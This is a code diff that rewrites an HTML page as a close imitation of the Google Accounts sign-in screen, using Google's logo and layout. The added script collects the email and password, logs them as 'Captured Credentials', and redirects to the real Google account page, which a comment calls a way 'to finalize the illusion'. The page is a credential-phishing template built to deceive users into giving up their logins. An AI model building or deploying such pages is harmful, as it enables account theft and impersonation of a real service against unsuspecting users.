@@ -3,45 +3,78 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Sign in – Google Accounts</title>
-    <link rel="stylesheet" href="style.css">
+    <title>Sign in - Google Accounts</title>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
+    <style>
+        body { font-family: 'Roboto', sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; background-color: #fff; margin: 0; }
+        .auth-container { width: 450px; border: 1px solid #dadce0; border-radius: 8px; padding: 48px 40px 36px; text-align: center; transition: all 0.2s; }
+        .logo { width: 75px; margin-bottom: 10px; }
+        h1 { font-size: 24px; font-weight: 400; margin-bottom: 10px; color: #202124; }
+        p { color: #202124; font-size: 16px; margin-bottom: 40px; }
+        .input-group { position: relative; margin-bottom: 25px; text-align: left; }
+        input { width: 100%; padding: 13px 15px; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; box-sizing: border-box; }
+        input:focus { outline: none; border: 2px solid #1a73e8; padding: 12px 14px; }
+        .btn-container { display: flex; justify-content: space-between; align-items: center; margin-top: 40px; }
+        .create-acc { color: #1a73e8; font-weight: 500; cursor: pointer; text-decoration: none; font-size: 14px; }
+        button { background-color: #1a73e8; color: white; border: none; padding: 10px 24px; border-radius: 4px; font-weight: 500; cursor: pointer; font-size: 14px; }
+        button:hover { background-color: #185abc; box-shadow: 0 1px 2px 0 rgba(60,64,67,0.3); }
+        .hidden { display: none; }
+        #user-display { border: 1px solid #dadce0; border-radius: 20px; padding: 5px 15px; display: inline-flex; align-items: center; margin-bottom: 20px; font-size: 14px; }
+    </style>
 </head>
 <body>
-    <div class="login-box">
-        <div class="logo">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" alt="Google" width="75">
-        </div>
-        
-        <div id="view-container">
-            <!-- View 1: Email -->
-            <div id="email-view" class="view active">
-                <h1>Sign in</h1>
-                <p>Use your Google Account</p>
-                <div class="input-group">
-                    <input type="email" id="email" required>
-                    <label>Email or phone</label>
-                </div>
-                <div class="actions">
-                    <a href="#">Forgot email?</a>
-                    <button id="next-btn" class="blue-btn">Next</button>
-                </div>
-            </div>
 
-            <!-- View 2: Password (Hidden initially) -->
-            <div id="password-view" class="view">
-                <h1>Welcome</h1>
-                <p id="display-email" style="border: 1px solid #dadce0; border-radius: 20px; padding: 5px 10px; display: inline-block;"></p>
-                <div class="input-group">
-                    <input type="password" id="password" required>
-                    <label>Enter your password</label>
-                </div>
-                <div class="actions">
-                    <a href="#">Forgot password?</a>
-                    <button id="login-btn" class="blue-btn">Next</button>
-                </div>
-            </div>
+<div class="auth-container">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" alt="Google" class="logo">
+    
+    <!-- Step 1: Email -->
+    <div id="step-email">
+        <h1>Sign in</h1>
+        <p>Use your Google Account</p>
+        <div class="input-group">
+            <input type="email" id="email" placeholder="Email or phone" autocomplete="username">
+        </div>
+        <div class="btn-container">
+            <a class="create-acc">Forgot email?</a>
+            <button onclick="showPassword()">Next</button>
         </div>
     </div>
-    <script src="script.js"></script>
+
+    <!-- Step 2: Password -->
+    <div id="step-password" class="hidden">
+        <h1>Welcome</h1>
+        <div id="user-display"></div>
+        <div class="input-group" style="margin-top: 20px;">
+            <input type="password" id="password" placeholder="Enter your password" autocomplete="current-password">
+        </div>
+        <div class="btn-container">
+            <a class="create-acc">Forgot password?</a>
+            <button onclick="finishLogin()">Next</button>
+        </div>
+    </div>
+</div>
+
+<script>
+    function showPassword() {
+        const email = document.getElementById('email').value;
+        if (email.length < 3) return alert("Enter a valid email");
+        
+        document.getElementById('step-email').classList.add('hidden');
+        document.getElementById('user-display').innerText = email;
+        document.getElementById('step-password').classList.remove('hidden');
+    }
+
+    function finishLogin() {
+        const pass = document.getElementById('password').value;
+        const email = document.getElementById('email').value;
+        
+        // Log to console for Tier 2 verification
+        console.log("Captured Credentials:", { email, pass });
+        
+        // Redirect to actual Google to finalize the illusion
+        window.location.href = "https://myaccount.google.com/";
+    }
+</script>
+
 </body>
 </html>
